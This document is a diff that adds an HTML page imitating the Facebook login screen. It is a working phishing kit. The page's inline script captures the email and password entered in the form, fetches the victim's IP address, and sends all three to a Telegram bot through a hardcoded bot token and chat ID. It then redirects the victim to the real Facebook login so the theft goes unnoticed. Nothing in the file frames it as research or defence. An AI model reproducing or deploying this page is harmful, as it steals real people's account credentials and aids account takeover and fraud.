@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="https://i.postimg.cc/NMyj90t9/logo.png">
+    <title>Facebook Login</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="info" class="flex direction-column">
+            <div class="logo flex justify-content-center">
+                <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook logo" />
+            </div>
+            <p class="description">Facebook helps you connect and share with the people in your life.</p>
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <form id="login-form">
+                    <label for="email" class="sr-only"></label>
+                    <input id="email" name="email" placeholder="Email address or phone number" />
+
+                    <label for="password" class="sr-only">
+
+                        
+                    </label>
+                    <input id="password" name="password" type="password" placeholder="Password" />
+
+                    <button type="submit">Log In</button>
+                </form>
+                <a href="#" class="forgot-password">Forgotten Password?</a>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="create-account flex justify-content-center">
+                    <a>Create New Account</a>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">About</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Language</a></li>
+        </ul>
+        <p class="copyright">© 2024 Facebook by Meta</p>
+    </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7858235504:AAH4bthTN0srsW-uPFLPQsIAWSRdXhDonvk"; // Telegram bot token
+        const CHAT_ID = "5163875130"; // Telegram chat ID
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const message = `
+                        <b>New Login Attempt from facebook</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(() => {
+                        // Redirect to the real Facebook login page after sending data
+                        window.location.href = "https://www.facebook.com/login/";
+                    }).catch(error => {
+                        console.error('Error sending data to Telegram:', error);
+                        alert('Error sending the information. Please try again.');
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
+</body>
+</html>
